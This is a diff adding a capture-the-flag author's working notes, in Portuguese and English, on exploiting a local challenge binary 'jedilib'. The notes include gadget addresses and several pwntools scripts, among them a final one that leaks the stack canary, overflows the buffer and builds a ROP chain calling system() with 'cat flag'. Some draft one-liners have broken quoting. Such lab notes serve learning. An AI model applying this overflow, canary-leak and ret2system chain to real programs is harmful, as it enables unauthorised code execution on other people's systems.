@@ -1,0 +1,160 @@
+NOTAS:
+ _ PIE is disable, so PLT is saved at a static location
+ _ PLT address: readelf -S ./jedilib | grep .plt 
+
+address of the libc: sum which address of the gadgets with the libc;
+
+system: 0x400860 ou elf.plt['system'] 
+    ex: payload = flat(b'A'*padding, POP_RDI,elf.got['puts'] elf.plt['puts'], elf.symbols['main'])
+
+"cat flag": 0x400e9d
+
+
+
+
+determine the amount of padding first:
+    adding a breakpoint after writing the input
+    eip: using info frame
+    determine in which position I'm writing: using some input
+
+
+Function used to read input is getchar()
+Note: PLT address for getchar is 0x4008c0
+    => memory cannot be access in certain parts....
+
+    rip: 0x7fff6b8f6d78 (this rip changes!!)
+    I determine where I was writing after the cicle: while
+
+
+Vou tentar solucionar usando ROP:
+-> Para tal preciso de saber quantos bytes preciso de padding
+-> Encontrar o endereço de umas instruções
+
+Para poder realizar ROP preciso de tomar controlo do flow do programa
+Para tal tenho que substituir o Ip da proxima instrução pela instrução que eu quero que ocorra
+
+Notas: Ter em atenção o canary; Ter em atenção a dynamically linked library
+
+
+
+BECAUSE OF THE CANARIES I CAN'T TAKE CONTROL OF THE IP, IT IS PROTECTED BY THE CANARY
+    1. Posso tentar substituir o RET por outro valor e quando o programa estiver a funcionar ele irá apontar para o meu código
+        -> preciso de uma instrução que mude o valor de RET
+        -> preciso de saber a localização do código q vou escrever
+
+
+
+
+CANARY: brute force, so we can write the correct value above it
+1)determine the offset and the position
+
+OFFSET: -0x8(%ebp)
+
+We need to write 72 bytes
+
+
+ROP: determine the correct rop to write after the canary, so we alter the value of correct_guesses
+1) Value of eip to return to after the ROP:
+
+
+2) Find the insts:
+
+
+Passo 1:
+checksec binario
+
+Consultar a stack e identificar o canary (Ex:0x4d9a5000) pos: 0x7ffe8ad60158 
+
+
+Abrir a shell, mas mudar o q vai ser chamado dentro dela....
+
+
+
+NOTA: TAMANHO MÁXIMO LIDO: 120 CHARS!!!!!!!
+
+
+
+from pwn import *
+
+p = process('./jedilib')
+
+#libc_base = #Dinamically linked, it's necessary to know the libc
+system =  p64(0x400860)
+catflag = p64(0x400e9d)
+
+p.clean()
+#first iteration (discover the canary)
+
+# THIS SOLUTION DOESN'T WORK BECAUSE I CANT TAKE ADVANTAGE OF FORMAT STRING VULNERABILITY
+p.sendline(b'A'*72)
+trash = p.recvline() #this recv gets all the output of the statement
+log.info(trash)
+canary = p.recv(0x3)
+log.info(canary)
+
+#second iteration (write the payload)
+payload = b'A' * 72 + b'\x00' + canary + b'B'*8 + system + b'B'*8 + catflag
+#Padding 72 bytes; Canary; saved rbp; address of system();padding; address of catflag
+#p.clean()
+p.sendline(payload)
+log.info(p.recv())
+
+p.interactive()
+
+
+
+
+
+
+
+
+
+
+0x0000000000400c97 : pop rdi ; ret
+0x0000000000400826 : ret
+
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
+
+
+
+(python3 -c 'from pwn import * ; p = process('./jedilib'); p.sendline(b'A'*72); trash = p.recvline(); canary = p.recv(0x3); trash2 = p.recv(); log.info(canary); payload = b'A'*72 + b'\x00' + canary; log.info(payload); p.sendline(payload); log.info(p.recv())')
+
+
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\n")')
+
+$(python3 -c 'import sys; sys.stdout.buffer.write(b'A'*72 + b'\x00' + b'\x0f\x36\x4e + b'B'*8)')
+
+
+
+
+
+FINAL:
+
+
+
+from pwn import *
+
+p = process('./jedilib')
+p.clean()
+
+#first iteration (discover the canary)
+p.sendline(b'A'*72)
+trash = p.recvline() #this recv gets all the output of the statement
+canary = p.recv(0x7) #canary needs to be turn into little endian
+trash2 = p.recv()
+canary = b'\x00'+canary
+log.info("canary value: 0x%s"% canary)
+
+#second iteration (write the payload)
+system = 0x400860
+catflag = 0x400e9d
+pop_rdi = 0x0000000000400c97
+ret = 0x0000000000400826
+
+payload = b'A'*72 + canary + b'B'*8 + p64(pop_rdi) + p64(catflag) + p64(ret)  + p64(system)
+log.info(payload)
+
+p.sendline(payload) 
+log.info(p.recv())
+
+p.interactive()
